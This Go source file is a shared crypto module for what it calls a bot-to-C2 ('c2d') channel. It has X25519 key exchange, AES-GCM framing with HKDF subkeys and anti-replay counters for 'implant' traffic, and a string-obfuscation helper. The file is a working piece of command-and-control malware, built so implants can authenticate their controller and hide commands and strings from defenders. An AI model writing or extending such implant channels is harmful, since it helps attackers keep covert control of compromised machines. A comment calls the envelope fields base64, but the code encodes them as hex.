package common

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
)

const KeySize = 32

func GenerateKey() ([]byte, error) {
	k := make([]byte, KeySize)
	if _, err := rand.Read(k); err != nil {
		return nil, err
	}
	return k, nil
}

func GenerateECDHKey() (*ecdh.PrivateKey, error) {
	return ecdh.X25519().GenerateKey(rand.Reader)
}

func ECDHShared(priv *ecdh.PrivateKey, pub []byte) ([]byte, error) {
	pubKey, err := ecdh.X25519().NewPublicKey(pub)
	if err != nil {
		return nil, err
	}
	return priv.ECDH(pubKey)
}

func Encrypt(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func Decrypt(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errors.New("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func Hash(data []byte) []byte {
	h := sha256.Sum256(data)
	return h[:]
}

func RandomString(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func ObfuscateString(s string) string {
	key, _ := GenerateKey()
	enc, _ := Encrypt([]byte(s), key)
	return hex.EncodeToString(append(key, enc...))
}

func DeobfuscateString(s string) (string, error) {
	b, err := hex.DecodeString(s)
	if err != nil {
		return "", err
	}
	if len(b) < 32 {
		return "", errors.New("too short")
	}
	key, data := b[:32], b[32:]
	dec, err := Decrypt(data, key)
	if err != nil {
		return "", err
	}
	return string(dec), nil
}

// ---------------------------------------------------------------------------
// Channel crypto: E2E encryption for the bot <-> c2d WebSocket channel.
//
// Handshake: the implant generates an ephemeral X25519 key and sends it in
// its hello frame; both sides derive the shared secret with the server's
// static key (implant: eph * serverPub, server: serverPriv * eph). The
// server proves possession of its key by answering the hello with an
// encrypted ack, so the implant authenticates the server before anything
// else is sent. All frames after the handshake are AES-256-GCM sealed with
// per-direction HKDF subkeys and monotonic sequence numbers (anti-replay).
// ---------------------------------------------------------------------------

// HKDF-SHA256 (RFC 5869) - kept local so go.mod can stay on go 1.21.
func HKDF(secret, salt, info []byte, length int) []byte {
	prk := HMAC(secret, salt)
	out := make([]byte, 0, length)
	t := []byte{}
	for i := 1; len(out) < length; i++ {
		t = HMAC(append(append(t, info...), byte(i)), prk)
		out = append(out, t...)
	}
	return out[:length]
}

func HMAC(msg, key []byte) []byte {
	mac := hmac.New(sha256.New, key)
	mac.Write(msg)
	return mac.Sum(nil)
}

// ChannelCrypto holds the per-connection AEAD state for one direction pair.
type ChannelCrypto struct {
	Up      []byte // implant -> server key
	Down    []byte // server -> implant key
	seqUp   uint64
	seqDown uint64
}

// DeriveChannel derives session subkeys from an X25519 shared secret.
func DeriveChannel(shared, ephPub, serverPub, salt []byte) *ChannelCrypto {
	master := HKDF(shared, salt, append(append([]byte("centipede-v1|"), ephPub...), serverPub...), 32)
	return &ChannelCrypto{
		Up:   HKDF(master, nil, []byte("centipede-up"), 32),
		Down: HKDF(master, nil, []byte("centipede-down"), 32),
	}
}

// Seal encrypts a plaintext frame for a direction. Envelope:
// {"e":1,"n":<nonce b64>,"c":<ciphertext+tag b64>} with the direction and
// sequence bound into the AEAD as additional data.
func (cc *ChannelCrypto) Seal(up bool, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(keyForDir(cc, up))
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	seq := cc.nextSeq(up)
	aad := make([]byte, 9)
	if up {
		aad[0] = 1
	}
	putUint64(aad[1:], seq)
	ct := gcm.Seal(nil, nonce, plaintext, aad)
	env := map[string]interface{}{"e": 1, "n": hex.EncodeToString(nonce), "c": hex.EncodeToString(ct)}
	return json.Marshal(env)
}

// Open decrypts an envelope frame; returns an error on auth failure or on a
// replayed sequence number.
func (cc *ChannelCrypto) Open(up bool, data []byte) ([]byte, error) {
	var env struct {
		N string `json:"n"`
		C string `json:"c"`
	}
	if err := json.Unmarshal(data, &env); err != nil {
		return nil, errors.New("bad envelope")
	}
	nonce, err := hex.DecodeString(env.N)
	if err != nil {
		return nil, err
	}
	ct, err := hex.DecodeString(env.C)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(keyForDir(cc, up))
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	seq := cc.peekSeq(up)
	aad := make([]byte, 9)
	if up {
		aad[0] = 1
	}
	putUint64(aad[1:], seq)
	pt, err := gcm.Open(nil, nonce, ct, aad)
	if err != nil {
		return nil, errors.New("decrypt failed")
	}
	cc.bumpSeq(up)
	return pt, nil
}

func keyForDir(cc *ChannelCrypto, up bool) []byte {
	if up {
		return cc.Up
	}
	return cc.Down
}

func (cc *ChannelCrypto) nextSeq(up bool) uint64 {
	if up {
		cc.seqUp++
		return cc.seqUp
	}
	cc.seqDown++
	return cc.seqDown
}

func (cc *ChannelCrypto) peekSeq(up bool) uint64 {
	if up {
		return cc.seqUp + 1
	}
	return cc.seqDown + 1
}

func (cc *ChannelCrypto) bumpSeq(up bool) {
	if up {
		cc.seqUp++
		return
	}
	cc.seqDown++
}

func putUint64(b []byte, v uint64) {
	for i := 7; i >= 0; i-- {
		b[i] = byte(v)
		v >>= 8
	}
}
